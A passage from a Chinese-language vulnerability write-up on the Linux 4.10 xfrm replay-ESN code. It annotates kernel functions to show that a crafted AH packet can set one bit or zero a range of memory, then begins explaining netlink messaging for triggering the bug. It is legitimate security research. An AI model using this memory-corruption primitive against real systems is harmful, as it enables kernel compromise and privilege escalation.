        <span class="n">family</span> <span class="o">=</span> <span class="n">x</span><span class="o">-&gt;</span><span class="n">outer_mode</span><span class="o">-&gt;</span><span class="n">afinfo</span><span class="o">-&gt;</span><span class="n">family</span><span class="p">;</span>
        <span class="k">goto</span> <span class="n">resume</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="n">daddr</span> <span class="o">=</span> <span class="p">(</span><span class="n">xfrm_address_t</span> <span class="o">*</span><span class="p">)(</span><span class="n">skb_network_header</span><span class="p">(</span><span class="n">skb</span><span class="p">)</span> <span class="o">+</span>
                   <span class="n">XFRM_SPI_SKB_CB</span><span class="p">(</span><span class="n">skb</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">daddroff</span><span class="p">);</span>
    <span class="n">family</span> <span class="o">=</span> <span class="n">XFRM_SPI_SKB_CB</span><span class="p">(</span><span class="n">skb</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">family</span><span class="p">;</span>

    <span class="cm">/* if tunnel is present override skb-&gt;mark value with tunnel i_key */</span>
    <span class="k">switch</span> <span class="p">(</span><span class="n">family</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">case</span> <span class="nl">AF_INET</span><span class="p">:</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">XFRM_TUNNEL_SKB_CB</span><span class="p">(</span><span class="n">skb</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">tunnel</span><span class="p">.</span><span class="n">ip4</span><span class="p">)</span> <span class="c1">// p32</span>
            <span class="n">mark</span> <span class="o">=</span> <span class="n">be32_to_cpu</span><span class="p">(</span><span class="n">XFRM_TUNNEL_SKB_CB</span><span class="p">(</span><span class="n">skb</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">tunnel</span><span class="p">.</span><span class="n">ip4</span><span class="o">-&gt;</span><span class="n">parms</span><span class="p">.</span><span class="n">i_key</span><span class="p">);</span>
        <span class="k">break</span><span class="p">;</span>
    <span class="k">case</span> <span class="nl">AF_INET6</span><span class="p">:</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">XFRM_TUNNEL_SKB_CB</span><span class="p">(</span><span class="n">skb</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">tunnel</span><span class="p">.</span><span class="n">ip6</span><span class="p">)</span>
            <span class="n">mark</span> <span class="o">=</span> <span class="n">be32_to_cpu</span><span class="p">(</span><span class="n">XFRM_TUNNEL_SKB_CB</span><span class="p">(</span><span class="n">skb</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">tunnel</span><span class="p">.</span><span class="n">ip6</span><span class="o">-&gt;</span><span class="n">parms</span><span class="p">.</span><span class="n">i_key</span><span class="p">);</span>
        <span class="k">break</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="cm">/* Allocate new secpath or COW existing one. */</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">skb</span><span class="o">-&gt;</span><span class="n">sp</span> <span class="o">||</span> <span class="n">atomic_read</span><span class="p">(</span><span class="o">&amp;</span><span class="n">skb</span><span class="o">-&gt;</span><span class="n">sp</span><span class="o">-&gt;</span><span class="n">refcnt</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">struct</span> <span class="n">sec_path</span> <span class="o">*</span><span class="n">sp</span><span class="p">;</span>

        <span class="n">sp</span> <span class="o">=</span> <span class="n">secpath_dup</span><span class="p">(</span><span class="n">skb</span><span class="o">-&gt;</span><span class="n">sp</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">sp</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">XFRM_INC_STATS</span><span class="p">(</span><span class="n">net</span><span class="p">,</span> <span class="n">LINUX_MIB_XFRMINERROR</span><span class="p">);</span>
            <span class="k">goto</span> <span class="n">drop</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">skb</span><span class="o">-&gt;</span><span class="n">sp</span><span class="p">)</span>
            <span class="n">secpath_put</span><span class="p">(</span><span class="n">skb</span><span class="o">-&gt;</span><span class="n">sp</span><span class="p">);</span>
        <span class="n">skb</span><span class="o">-&gt;</span><span class="n">sp</span> <span class="o">=</span> <span class="n">sp</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="n">seq</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">spi</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">err</span> <span class="o">=</span> <span class="n">xfrm_parse_spi</span><span class="p">(</span><span class="n">skb</span><span class="p">,</span> <span class="n">nexthdr</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">spi</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">seq</span><span class="p">))</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span> <span class="c1">//spi =0</span>
        <span class="n">XFRM_INC_STATS</span><span class="p">(</span><span class="n">net</span><span class="p">,</span> <span class="n">LINUX_MIB_XFRMINHDRERROR</span><span class="p">);</span>
        <span class="k">goto</span> <span class="n">drop</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">do</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">skb</span><span class="o">-&gt;</span><span class="n">sp</span><span class="o">-&gt;</span><span class="n">len</span> <span class="o">==</span> <span class="n">XFRM_MAX_DEPTH</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">XFRM_INC_STATS</span><span class="p">(</span><span class="n">net</span><span class="p">,</span> <span class="n">LINUX_MIB_XFRMINBUFFERERROR</span><span class="p">);</span>
            <span class="k">goto</span> <span class="n">drop</span><span class="p">;</span>
        <span class="p">}</span>

<span class="p">[</span><span class="mi">1</span><span class="p">]</span>     <span class="n">x</span> <span class="o">=</span> <span class="n">xfrm_state_lookup</span><span class="p">(</span><span class="n">net</span><span class="p">,</span> <span class="n">mark</span><span class="p">,</span> <span class="n">daddr</span><span class="p">,</span> <span class="n">spi</span><span class="p">,</span> <span class="n">nexthdr</span><span class="p">,</span> <span class="n">family</span><span class="p">);</span><span class="c1">//找到对应的xfrm_state</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">x</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">XFRM_INC_STATS</span><span class="p">(</span><span class="n">net</span><span class="p">,</span> <span class="n">LINUX_MIB_XFRMINNOSTATES</span><span class="p">);</span>
            <span class="n">xfrm_audit_state_notfound</span><span class="p">(</span><span class="n">skb</span><span class="p">,</span> <span class="n">family</span><span class="p">,</span> <span class="n">spi</span><span class="p">,</span> <span class="n">seq</span><span class="p">);</span>
            <span class="k">goto</span> <span class="n">drop</span><span class="p">;</span>
        <span class="p">}</span>

        <span class="n">skb</span><span class="o">-&gt;</span><span class="n">sp</span><span class="o">-&gt;</span><span class="n">xvec</span><span class="p">[</span><span class="n">skb</span><span class="o">-&gt;</span><span class="n">sp</span><span class="o">-&gt;</span><span class="n">len</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">x</span><span class="p">;</span>

        <span class="n">spin_lock</span><span class="p">(</span><span class="o">&amp;</span><span class="n">x</span><span class="o">-&gt;</span><span class="n">lock</span><span class="p">);</span>

        <span class="k">if</span> <span class="p">(</span><span class="n">unlikely</span><span class="p">(</span><span class="n">x</span><span class="o">-&gt;</span><span class="n">km</span><span class="p">.</span><span class="n">state</span> <span class="o">!=</span> <span class="n">XFRM_STATE_VALID</span><span class="p">))</span> <span class="p">{</span>
            <span class="k">if</span> <span class="p">(</span><span class="n">x</span><span class="o">-&gt;</span><span class="n">km</span><span class="p">.</span><span class="n">state</span> <span class="o">==</span> <span class="n">XFRM_STATE_ACQ</span><span class="p">)</span>
                <span class="n">XFRM_INC_STATS</span><span class="p">(</span><span class="n">net</span><span class="p">,</span> <span class="n">LINUX_MIB_XFRMACQUIREERROR</span><span class="p">);</span>
            <span class="k">else</span>
                <span class="n">XFRM_INC_STATS</span><span class="p">(</span><span class="n">net</span><span class="p">,</span>
                           <span class="n">LINUX_MIB_XFRMINSTATEINVALID</span><span class="p">);</span>
            <span class="k">goto</span> <span class="n">drop_unlock</span><span class="p">;</span>
        <span class="p">}</span>

        <span class="k">if</span> <span class="p">((</span><span class="n">x</span><span class="o">-&gt;</span><span class="n">encap</span> <span class="o">?</span> <span class="n">x</span><span class="o">-&gt;</span><span class="n">encap</span><span class="o">-&gt;</span><span class="nl">encap_type</span> <span class="p">:</span> <span class="mi">0</span><span class="p">)</span> <span class="o">!=</span> <span class="n">encap_type</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">XFRM_INC_STATS</span><span class="p">(</span><span class="n">net</span><span class="p">,</span> <span class="n">LINUX_MIB_XFRMINSTATEMISMATCH</span><span class="p">);</span>
            <span class="k">goto</span> <span class="n">drop_unlock</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="c1">//x-&gt;repl 在 xfrm_init_replay赋值，可调用xfrm_replay_check_esn</span>
<span class="p">[</span><span class="mi">2</span><span class="p">]</span>     <span class="k">if</span> <span class="p">(</span><span class="n">x</span><span class="o">-&gt;</span><span class="n">repl</span><span class="o">-&gt;</span><span class="n">check</span><span class="p">(</span><span class="n">x</span><span class="p">,</span> <span class="n">skb</span><span class="p">,</span> <span class="n">seq</span><span class="p">))</span> <span class="p">{</span>
            <span class="n">XFRM_INC_STATS</span><span class="p">(</span><span class="n">net</span><span class="p">,</span> <span class="n">LINUX_MIB_XFRMINSTATESEQERROR</span><span class="p">);</span>
            <span class="k">goto</span> <span class="n">drop_unlock</span><span class="p">;</span>
        <span class="p">}</span>

        <span class="k">if</span> <span class="p">(</span><span class="n">xfrm_state_check_expire</span><span class="p">(</span><span class="n">x</span><span class="p">))</span> <span class="p">{</span><span class="c1">//check x-&gt;lft内容</span>
            <span class="n">XFRM_INC_STATS</span><span class="p">(</span><span class="n">net</span><span class="p">,</span> <span class="n">LINUX_MIB_XFRMINSTATEEXPIRED</span><span class="p">);</span>
            <span class="k">goto</span> <span class="n">drop_unlock</span><span class="p">;</span>
        <span class="p">}</span>

        <span class="n">spin_unlock</span><span class="p">(</span><span class="o">&amp;</span><span class="n">x</span><span class="o">-&gt;</span><span class="n">lock</span><span class="p">);</span>
        <span class="c1">//检查tunnel参数</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">xfrm_tunnel_check</span><span class="p">(</span><span class="n">skb</span><span class="p">,</span> <span class="n">x</span><span class="p">,</span> <span class="n">family</span><span class="p">))</span> <span class="p">{</span>
            <span class="n">XFRM_INC_STATS</span><span class="p">(</span><span class="n">net</span><span class="p">,</span> <span class="n">LINUX_MIB_XFRMINSTATEMODEERROR</span><span class="p">);</span>
            <span class="k">goto</span> <span class="n">drop</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="c1">//根据x-&gt;replay_esn中，seq、replay_windows关系，返回seqhi </span>
        <span class="n">seq_hi</span> <span class="o">=</span> <span class="n">htonl</span><span class="p">(</span><span class="n">xfrm_replay_seqhi</span><span class="p">(</span><span class="n">x</span><span class="p">,</span> <span class="n">seq</span><span class="p">));</span>

        <span class="n">XFRM_SKB_CB</span><span class="p">(</span><span class="n">skb</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">seq</span><span class="p">.</span><span class="n">input</span><span class="p">.</span><span class="n">low</span> <span class="o">=</span> <span class="n">seq</span><span class="p">;</span>
        <span class="n">XFRM_SKB_CB</span><span class="p">(</span><span class="n">skb</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">seq</span><span class="p">.</span><span class="n">input</span><span class="p">.</span><span class="n">hi</span> <span class="o">=</span> <span class="n">seq_hi</span><span class="p">;</span>

        <span class="n">skb_dst_force</span><span class="p">(</span><span class="n">skb</span><span class="p">);</span>
        <span class="n">dev_hold</span><span class="p">(</span><span class="n">skb</span><span class="o">-&gt;</span><span class="n">dev</span><span class="p">);</span>

        <span class="n">nexthdr</span> <span class="o">=</span> <span class="n">x</span><span class="o">-&gt;</span><span class="n">type</span><span class="o">-&gt;</span><span class="n">input</span><span class="p">(</span><span class="n">x</span><span class="p">,</span> <span class="n">skb</span><span class="p">);</span>

        <span class="k">if</span> <span class="p">(</span><span class="n">nexthdr</span> <span class="o">==</span> <span class="o">-</span><span class="n">EINPROGRESS</span><span class="p">)</span>
            <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="nl">resume</span><span class="p">:</span>
        <span class="n">dev_put</span><span class="p">(</span><span class="n">skb</span><span class="o">-&gt;</span><span class="n">dev</span><span class="p">);</span>

        <span class="n">spin_lock</span><span class="p">(</span><span class="o">&amp;</span><span class="n">x</span><span class="o">-&gt;</span><span class="n">lock</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">nexthdr</span> <span class="o">&lt;=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">if</span> <span class="p">(</span><span class="n">nexthdr</span> <span class="o">==</span> <span class="o">-</span><span class="n">EBADMSG</span><span class="p">)</span> <span class="p">{</span>
                <span class="n">xfrm_audit_state_icvfail</span><span class="p">(</span><span class="n">x</span><span class="p">,</span> <span class="n">skb</span><span class="p">,</span>
                             <span class="n">x</span><span class="o">-&gt;</span><span class="n">type</span><span class="o">-&gt;</span><span class="n">proto</span><span class="p">);</span>
                <span class="n">x</span><span class="o">-&gt;</span><span class="n">stats</span><span class="p">.</span><span class="n">integrity_failed</span><span class="o">++</span><span class="p">;</span>
            <span class="p">}</span>
            <span class="n">XFRM_INC_STATS</span><span class="p">(</span><span class="n">net</span><span class="p">,</span> <span class="n">LINUX_MIB_XFRMINSTATEPROTOERROR</span><span class="p">);</span>
            <span class="k">goto</span> <span class="n">drop_unlock</span><span class="p">;</span>
        <span class="p">}</span>

        <span class="cm">/* only the first xfrm gets the encap type */</span>
        <span class="n">encap_type</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
        <span class="c1">// async = 0 并调用xfrm_replay_recheck_esn</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">async</span> <span class="o">&amp;&amp;</span> <span class="n">x</span><span class="o">-&gt;</span><span class="n">repl</span><span class="o">-&gt;</span><span class="n">recheck</span><span class="p">(</span><span class="n">x</span><span class="p">,</span> <span class="n">skb</span><span class="p">,</span> <span class="n">seq</span><span class="p">))</span> <span class="p">{</span>
            <span class="n">XFRM_INC_STATS</span><span class="p">(</span><span class="n">net</span><span class="p">,</span> <span class="n">LINUX_MIB_XFRMINSTATESEQERROR</span><span class="p">);</span>
            <span class="k">goto</span> <span class="n">drop_unlock</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="c1">//调用xfrm_replay_advance_esn</span>
<span class="p">[</span><span class="mi">3</span><span class="p">]</span>     <span class="n">x</span><span class="o">-&gt;</span><span class="n">repl</span><span class="o">-&gt;</span><span class="n">advance</span><span class="p">(</span><span class="n">x</span><span class="p">,</span> <span class="n">seq</span><span class="p">);</span>

        <span class="n">x</span><span class="o">-&gt;</span><span class="n">curlft</span><span class="p">.</span><span class="n">bytes</span> <span class="o">+=</span> <span class="n">skb</span><span class="o">-&gt;</span><span class="n">len</span><span class="p">;</span>
        <span class="n">x</span><span class="o">-&gt;</span><span class="n">curlft</span><span class="p">.</span><span class="n">packets</span><span class="o">++</span><span class="p">;</span>

        <span class="n">spin_unlock</span><span class="p">(</span><span class="o">&amp;</span><span class="n">x</span><span class="o">-&gt;</span><span class="n">lock</span><span class="p">);</span>

        <span class="n">XFRM_MODE_SKB_CB</span><span class="p">(</span><span class="n">skb</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">protocol</span> <span class="o">=</span> <span class="n">nexthdr</span><span class="p">;</span>

        <span class="n">inner_mode</span> <span class="o">=</span> <span class="n">x</span><span class="o">-&gt;</span><span class="n">inner_mode</span><span class="p">;</span>

        <span class="k">if</span> <span class="p">(</span><span class="n">x</span><span class="o">-&gt;</span><span class="n">sel</span><span class="p">.</span><span class="n">family</span> <span class="o">==</span> <span class="n">AF_UNSPEC</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">inner_mode</span> <span class="o">=</span> <span class="n">xfrm_ip2inner_mode</span><span class="p">(</span><span class="n">x</span><span class="p">,</span> <span class="n">XFRM_MODE_SKB_CB</span><span class="p">(</span><span class="n">skb</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">protocol</span><span class="p">);</span>
            <span class="k">if</span> <span class="p">(</span><span class="n">inner_mode</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
                <span class="n">XFRM_INC_STATS</span><span class="p">(</span><span class="n">net</span><span class="p">,</span> <span class="n">LINUX_MIB_XFRMINSTATEMODEERROR</span><span class="p">);</span>
                <span class="k">goto</span> <span class="n">drop</span><span class="p">;</span>
            <span class="p">}</span>
        <span class="p">}</span>

        <span class="k">if</span> <span class="p">(</span><span class="n">inner_mode</span><span class="o">-&gt;</span><span class="n">input</span><span class="p">(</span><span class="n">x</span><span class="p">,</span> <span class="n">skb</span><span class="p">))</span> <span class="p">{</span>
            <span class="n">XFRM_INC_STATS</span><span class="p">(</span><span class="n">net</span><span class="p">,</span> <span class="n">LINUX_MIB_XFRMINSTATEMODEERROR</span><span class="p">);</span>
            <span class="k">goto</span> <span class="n">drop</span><span class="p">;</span>
        <span class="p">}</span>

        <span class="k">if</span> <span class="p">(</span><span class="n">x</span><span class="o">-&gt;</span><span class="n">outer_mode</span><span class="o">-&gt;</span><span class="n">flags</span> <span class="o">&amp;</span> <span class="n">XFRM_MODE_FLAG_TUNNEL</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">decaps</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
            <span class="k">break</span><span class="p">;</span>
        <span class="p">}</span>

        <span class="cm">/*</span>
<span class="cm">         * We need the inner address.  However, we only get here for</span>
<span class="cm">         * transport mode so the outer address is identical.</span>
<span class="cm">         */</span>
        <span class="n">daddr</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">x</span><span class="o">-&gt;</span><span class="n">id</span><span class="p">.</span><span class="n">daddr</span><span class="p">;</span>
        <span class="n">family</span> <span class="o">=</span> <span class="n">x</span><span class="o">-&gt;</span><span class="n">outer_mode</span><span class="o">-&gt;</span><span class="n">afinfo</span><span class="o">-&gt;</span><span class="n">family</span><span class="p">;</span>

        <span class="n">err</span> <span class="o">=</span> <span class="n">xfrm_parse_spi</span><span class="p">(</span><span class="n">skb</span><span class="p">,</span> <span class="n">nexthdr</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">spi</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">seq</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">err</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">XFRM_INC_STATS</span><span class="p">(</span><span class="n">net</span><span class="p">,</span> <span class="n">LINUX_MIB_XFRMINHDRERROR</span><span class="p">);</span>
            <span class="k">goto</span> <span class="n">drop</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span> <span class="k">while</span> <span class="p">(</span><span class="o">!</span><span class="n">err</span><span class="p">);</span>

    <span class="n">err</span> <span class="o">=</span> <span class="n">xfrm_rcv_cb</span><span class="p">(</span><span class="n">skb</span><span class="p">,</span> <span class="n">family</span><span class="p">,</span> <span class="n">x</span><span class="o">-&gt;</span><span class="n">type</span><span class="o">-&gt;</span><span class="n">proto</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">err</span><span class="p">)</span>
        <span class="k">goto</span> <span class="n">drop</span><span class="p">;</span>

    <span class="n">nf_reset</span><span class="p">(</span><span class="n">skb</span><span class="p">);</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">decaps</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">skb_dst_drop</span><span class="p">(</span><span class="n">skb</span><span class="p">);</span>
        <span class="n">netif_rx</span><span class="p">(</span><span class="n">skb</span><span class="p">);</span>
        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
        <span class="k">return</span> <span class="n">x</span><span class="o">-&gt;</span><span class="n">inner_mode</span><span class="o">-&gt;</span><span class="n">afinfo</span><span class="o">-&gt;</span><span class="n">transport_finish</span><span class="p">(</span><span class="n">skb</span><span class="p">,</span> <span class="n">async</span><span class="p">);</span>
    <span class="p">}</span>

<span class="nl">drop_unlock</span><span class="p">:</span>
    <span class="n">spin_unlock</span><span class="p">(</span><span class="o">&amp;</span><span class="n">x</span><span class="o">-&gt;</span><span class="n">lock</span><span class="p">);</span>
<span class="nl">drop</span><span class="p">:</span>
    <span class="n">xfrm_rcv_cb</span><span class="p">(</span><span class="n">skb</span><span class="p">,</span> <span class="n">family</span><span class="p">,</span> <span class="n">x</span> <span class="o">&amp;&amp;</span> <span class="n">x</span><span class="o">-&gt;</span><span class="n">type</span> <span class="o">?</span> <span class="n">x</span><span class="o">-&gt;</span><span class="n">type</span><span class="o">-&gt;</span><span class="nl">proto</span> <span class="p">:</span> <span class="n">nexthdr</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">);</span>
    <span class="n">kfree_skb</span><span class="p">(</span><span class="n">skb</span><span class="p">);</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>
<p>在<a href="https://elixir.bootlin.com/linux/v4.10.6/source/net/xfrm/xfrm_replay.c#L434" target="_blank">xfrm_replay_check_esn</a>函数中，首先找到的还是<code>x-&gt;replay_esn</code>成员，接着检查[1]处某<code>bit</code>是否为1，否则退出。首先可以分析出该<code>bit</code>的计算方法，是<code>nr&gt;&gt;5</code>，即<code>(nr / 32)</code>，而<code>bitnr =  nr % 32</code>，而<code>bmp</code>的类型为<code>u32</code>，即<code>bmp[i]</code>的大小为<code>4*8 bit</code>，不难发现，<code>bmp</code>的作用就是表示某个值是否被占用。取一个情况<code>bitnr = (pos - diff) % replay_esn-&gt;replay_window</code>，其中<code>pos = (replay_esn-&gt;seq - 1) % replay_esn-&gt;replay_window</code>，<code>diff = top - seq =replay_esn-&gt;seq - seq</code>，因此<code>bitnr = (seq - 1 )% replay_esn-&gt;replay_window</code>，即<code>AH</code>中的<code>seq</code>是否被处理过。</p>
<pre><code>static int xfrm_replay_check_esn(struct xfrm_state *x,
                 struct sk_buff *skb, __be32 net_seq)
{
    unsigned int bitnr, nr;
    u32 diff;
    struct xfrm_replay_state_esn *replay_esn = x-&gt;replay_esn;
    u32 pos;
    u32 seq = ntohl(net_seq);
    u32 wsize = replay_esn-&gt;replay_window;
    u32 top = replay_esn-&gt;seq;
    u32 bottom = top - wsize + 1;

    if (!wsize)
        return 0;

    if (unlikely(seq == 0 &amp;&amp; replay_esn-&gt;seq_hi == 0 &amp;&amp;
             (replay_esn-&gt;seq &lt; replay_esn-&gt;replay_window - 1)))
        goto err;

    diff = top - seq;

    if (likely(top &gt;= wsize - 1)) {
        /* A. same subspace */
        if (likely(seq &gt; top) || seq &lt; bottom)
            return 0;
    } else {
        /* B. window spans two subspaces */
        if (likely(seq &gt; top &amp;&amp; seq &lt; bottom))
            return 0;
        if (seq &gt;= bottom)
            diff = ~seq + top + 1;
    }

    if (diff &gt;= replay_esn-&gt;replay_window) {
        x-&gt;stats.replay_window++;
        goto err;
    }

    pos = (replay_esn-&gt;seq - 1) % replay_esn-&gt;replay_window;

    if (pos &gt;= diff)
        bitnr = (pos - diff) % replay_esn-&gt;replay_window;
    else
        bitnr = replay_esn-&gt;replay_window - (diff - pos);

    nr = bitnr &gt;&gt; 5;
    bitnr = bitnr &amp; 0x1F;
[1] if (replay_esn-&gt;bmp[nr] &amp; (1U &lt;&lt; bitnr))
        goto err_replay;

    return 0;

err_replay:
    x-&gt;stats.replay++;
err:
    xfrm_audit_state_replay(x, skb, net_seq);
    return -EINVAL;
}</code></pre>
<p>而在<a href="https://elixir.bootlin.com/linux/v4.10.6/source/net/xfrm/xfrm_replay.c#L505" target="_blank">xfrm_replay_advance_esn</a>函数中，共有三处对<code>bmp</code>的写操作，其中在[1]处对于某一个<code>bit</code>执行<code>&amp;0</code>，将导致某一个<code>bit</code>被置零。在[2]处，可以发现函数对从<code>bmp[0]</code>到<code>bmp[(replay_esn-&gt;replay_window - 1) &gt;&gt; 5]</code>块内存均置零，而[3]处，这可以对某一个<code>bit</code>写1。</p>
<pre><code>static void xfrm_replay_advance_esn(struct xfrm_state *x, __be32 net_seq)
{
    unsigned int bitnr, nr, i;
    int wrap;
    u32 diff, pos, seq, seq_hi;
    struct xfrm_replay_state_esn *replay_esn = x-&gt;replay_esn;

    if (!replay_esn-&gt;replay_window)
        return;

    seq = ntohl(net_seq);
    pos = (replay_esn-&gt;seq - 1) % replay_esn-&gt;replay_window;
    seq_hi = xfrm_replay_seqhi(x, net_seq);
    wrap = seq_hi - replay_esn-&gt;seq_hi;

    if ((!wrap &amp;&amp; seq &gt; replay_esn-&gt;seq) || wrap &gt; 0) {
        if (likely(!wrap))
            diff = seq - replay_esn-&gt;seq;
        else
            diff = ~replay_esn-&gt;seq + seq + 1;

        if (diff &lt; replay_esn-&gt;replay_window) {
            for (i = 1; i &lt; diff; i++) {
                bitnr = (pos + i) % replay_esn-&gt;replay_window;
                nr = bitnr &gt;&gt; 5;
                bitnr = bitnr &amp; 0x1F;
[1]             replay_esn-&gt;bmp[nr] &amp;=  ~(1U &lt;&lt; bitnr);
            }
        } else {
            nr = (replay_esn-&gt;replay_window - 1) &gt;&gt; 5;
            for (i = 0; i &lt;= nr; i++)
[2]             replay_esn-&gt;bmp[i] = 0;
        }

        bitnr = (pos + diff) % replay_esn-&gt;replay_window;
        replay_esn-&gt;seq = seq;

        if (unlikely(wrap &gt; 0))
            replay_esn-&gt;seq_hi++;
    } else {
        diff = replay_esn-&gt;seq - seq;

        if (pos &gt;= diff)
            bitnr = (pos - diff) % replay_esn-&gt;replay_window;
        else
            bitnr = replay_esn-&gt;replay_window - (diff - pos);
    }

    nr = bitnr &gt;&gt; 5;
    bitnr = bitnr &amp; 0x1F;
[3] replay_esn-&gt;bmp[nr] |= (1U &lt;&lt; bitnr);

    if (xfrm_aevent_is_on(xs_net(x)))
        x-&gt;repl-&gt;notify(x, XFRM_REPLAY_UPDATE);
}</code></pre>
<p>因此，<strong>通过用户态空间发送一个<code>AH</code>数据包将导致，一个<code>bit</code>的内存写，或者一段空间的置零</strong>。</p>
<h1 data-content="1" id="d6317a23ef7d999fdc9d0bcff78f9f4b">漏洞触发与利用</h1>
<h2 data-content="1" id="13a8531fc44532c781ac972a1f3c2724">netlink套接字通信</h2>
<p>与熟悉的驱动或内核模块所使用的系统调用或<code>ioctl</code>机制不同，本漏洞触发使用过的是<code>netlink</code>通信机制。</p>
<blockquote>
<p>Netlink 是一种特殊的 socket，它是 Linux 所特有的，类似于 BSD 中的AF_ROUTE 但又远比它的功能强大。目前在Linux 内核中使用netlink 进行应用与内核通信的应用很多; 包括：路由 daemon（NETLINK_ROUTE），用户态 socket 协议（NETLINK_USERSOCK），防火墙（NETLINK_FIREWALL），netfilter 子系统（NETLINK_NETFILTER），内核事件向用户态通知（NETLINK_KOBJECT_UEVENT）， 通用 netlink（NETLINK_GENERIC）等。</p>
</blockquote>
<p>而基于<code>netlink</code>的内核通信与<code>socket</code>的通信方式一致，都是通过<code>sendto()，recvfrom()； sendmsg(), recvmsg()</code>的用户态<code>API</code>。</p>
<p>而发送到内核态的数据以协议包的形式进行解析，因此需要了解<code>xfrm</code>数据包的协议格式，其协议结构图及相关函数图示如下。</p>
<div class="highlight"><pre><span></span><span class="cm">/* ========================================================================</span>
<span class="cm"> *         Netlink Messages and Attributes Interface (As Seen On TV)</span>
<span class="cm"> * ------------------------------------------------------------------------</span>
<span class="cm"> *                          Messages Interface</span>
<span class="cm"> * ------------------------------------------------------------------------</span>
<span class="cm"> *</span>
<span class="cm"> * Message Format:</span>
<span class="cm"> *    &lt;--- nlmsg_total_size(payload)  ---&gt;</span>
<span class="cm"> *    &lt;-- nlmsg_msg_size(payload) -&gt;</span>
<span class="cm"> *   +----------+- - -+-------------+- - -+-------- - -</span>
<span class="cm"> *   | nlmsghdr | Pad |   Payload   | Pad | nlmsghdr</span>
<span class="cm"> *   +----------+- - -+-------------+- - -+-------- - -</span>
<span class="cm"> *   nlmsg_data(nlh)---^                   ^</span>
<span class="cm"> *   nlmsg_next(nlh)-----------------------+</span>
<span class="cm"> *</span>
<span class="cm"> * Payload Format:</span>
<span class="cm"> *    &lt;---------------------- nlmsg_len(nlh) ---------------------&gt;</span>
<span class="cm"> *    &lt;------ hdrlen ------&gt;       &lt;- nlmsg_attrlen(nlh, hdrlen) -&gt;</span>
<span class="cm"> *   +----------------------+- - -+--------------------------------+</span>
<span class="cm"> *   |     Family Header    | Pad |           Attributes           |</span>
<span class="cm"> *   +----------------------+- - -+--------------------------------+</span>
<span class="cm"> *   nlmsg_attrdata(nlh, hdrlen)---^</span>
<span class="cm"> *</span>
<span class="cm"> * Data Structures:</span>
<span class="cm"> *   struct nlmsghdr            netlink message header</span>
<span class="cm"> * ------------------------------------------------------------------------</span>
<span class="cm"> *                          Attributes Interface</span>
<span class="cm"> * ------------------------------------------------------------------------</span>
<span class="cm"> *</span>
<span class="cm"> * Attribute Format:</span>
<span class="cm"> *    &lt;------- nla_total_size(payload) -------&gt;</span>
<span class="cm"> *    &lt;---- nla_attr_size(payload) -----&gt;</span>
<span class="cm"> *   +----------+- - -+- - - - - - - - - +- - -+-------- - -</span>
<span class="cm"> *   |  Header  | Pad |     Payload      | Pad |  Header</span>
